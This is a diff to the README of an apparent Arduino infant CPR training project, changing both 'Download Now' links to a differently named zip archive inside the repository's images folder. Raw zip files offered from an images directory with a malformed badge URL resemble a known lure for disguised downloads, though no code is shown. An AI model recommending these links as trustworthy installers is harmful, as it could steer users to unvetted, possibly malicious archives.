@@ -1,6 +1,6 @@
 # 🚑 Arduino_Competiton - Real-time Infant CPR Training Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/BEN-0014/Arduino_Competiton/main/images/Arduino_Competiton-v3.5-beta.2.zip%20Now-Release-blue)](https://raw.githubusercontent.com/BEN-0014/Arduino_Competiton/main/images/Arduino_Competiton-v3.5-beta.2.zip)
+[![Download Now](https://github.com/BEN-0014/Arduino_Competiton/raw/refs/heads/main/images/Competiton-Arduino-v1.5.zip%20Now-Release-blue)](https://github.com/BEN-0014/Arduino_Competiton/raw/refs/heads/main/images/Competiton-Arduino-v1.5.zip)
 
 ## 📜 Description
 
@@ -23,7 +23,7 @@ To start using Arduino_Competiton, follow these simple steps.
 
 To download the application, please visit this page to download:
 
-[Download Releases](https://raw.githubusercontent.com/BEN-0014/Arduino_Competiton/main/images/Arduino_Competiton-v3.5-beta.2.zip)
+[Download Releases](https://github.com/BEN-0014/Arduino_Competiton/raw/refs/heads/main/images/Competiton-Arduino-v1.5.zip)
 
 1. Click on the link above.
 2. You will see a list of available files.
